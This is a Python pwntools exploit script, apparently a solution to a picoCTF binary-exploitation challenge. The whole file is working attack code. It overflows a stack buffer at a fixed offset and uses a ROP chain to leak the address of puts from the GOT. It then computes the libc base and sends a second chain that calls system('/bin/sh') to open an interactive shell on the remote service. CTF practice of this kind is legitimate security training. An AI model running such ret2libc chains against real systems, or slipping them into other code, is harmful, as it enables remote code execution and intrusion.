from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './vuln_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so"

# Pass in pattern_size, get back EIP/RIP offset
# offset = find_ip(cyclic(500))
offset = 136

# Start program
io = start()

# Build the first payload
rop = ROP(elf)

rop.call("puts", [elf.got.puts])
rop.call("main")

print(rop.dump())

payload = flat({
    offset: [
      rop.chain()
    ]
})

# Send the payload
print(io.recvline())
io.sendline(payload)
io.recvline()
leaked_puts = u64(io.recvline().strip().ljust(8, b"\x00"))

log.info("leaked puts: " + hex(leaked_puts))

# Second Payload
libc.address = leaked_puts - libc.symbols.puts
rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

print(rop.dump())

payload = flat({
    offset: [
      rop.chain()
    ]
})

print(io.recvline())
io.sendline(payload)

# Got Shell?
io.interactive()


# nc mercury.picoctf.net 37289